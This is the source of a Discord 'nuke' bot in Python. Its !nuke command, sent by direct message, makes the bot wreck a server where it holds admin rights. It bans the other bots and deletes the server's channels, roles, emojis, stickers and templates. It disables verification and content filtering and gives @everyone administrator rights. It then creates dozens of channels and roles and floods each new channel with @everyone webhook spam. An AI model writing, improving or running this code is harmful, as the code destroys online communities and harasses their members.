import os
import json
import random
import discord
from discord.ext import commands
from dotenv import load_dotenv
import asyncio

load_dotenv()

with open('config.json', 'r', encoding='utf-8') as f:
    config = json.load(f)

token = os.getenv('TOKEN')
if token is None:
    raise ValueError("TOKEN environment variable is not set")
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)

@bot.event
async def on_ready():
    print("Bot ready.")

async def perform_nuke(guild):
    tasks = []

    ban_list = [member for member in guild.members if member.bot and member != guild.me]

    tasks.extend(member.ban() for member in ban_list)
    tasks.extend(template.delete() for template in await guild.templates())
    tasks.extend(sticker.delete() for sticker in guild.stickers)
    tasks.extend(emoji.delete() for emoji in guild.emojis)
    tasks.extend(role.delete() for role in guild.roles if role != guild.default_role and role != guild.me.top_role)
    tasks.extend(channel.delete() for channel in guild.channels)
    tasks.append(guild.edit(name=config["server_name"], icon=None, system_channel=None, verification_level=discord.VerificationLevel.none, default_notifications=discord.NotificationLevel.all_messages, explicit_content_filter=discord.ContentFilter.disabled))
    tasks.append(guild.default_role.edit(permissions=discord.Permissions(administrator=True)))

    try:
        await asyncio.gather(*tasks)
    except Exception:
        pass
        
    colors = [discord.Color.red(), discord.Color.orange(), discord.Color.yellow(),discord.Color.green(), discord.Color.blue(), discord.Color.purple()]
    create_tasks = []

    for _ in range(50):
        create_tasks.append(guild.create_text_channel(config["channel_name"]))
        create_tasks.append(guild.create_role(name=config["role_name"], color=random.choice(colors)))

    await asyncio.gather(*create_tasks)

@bot.command()
async def nuke(ctx, server_id: int | None = None):
    if ctx.guild:
        return

    if server_id is None:
        await ctx.reply("**Wrong Usage!**\nCorrect Usage: `!nuke <server_id>`")
        return

    guild = bot.get_guild(server_id)
    if not guild:
        await ctx.reply(f"Server ID Not Found: `{server_id}`\nPlease Invite Bot To Server Before Using This Command.")
        return

    if not guild.me.guild_permissions.administrator:
        await ctx.reply("Bot Has No Admin Permissions.")
        return

    await ctx.reply("Starting to nuke the server.")
    await perform_nuke(guild)

@bot.event
async def on_guild_channel_create(channel):
    if channel.name == config["channel_name"]:
        try:
            webhook = await channel.create_webhook(name=config["webhook_name"])

            for _ in range(50):
                await webhook.send(f"@everyone @here\n{config['message']}", tts=True)

        except discord.errors.Forbidden:
            pass
        except Exception:
            pass

bot.run(token)
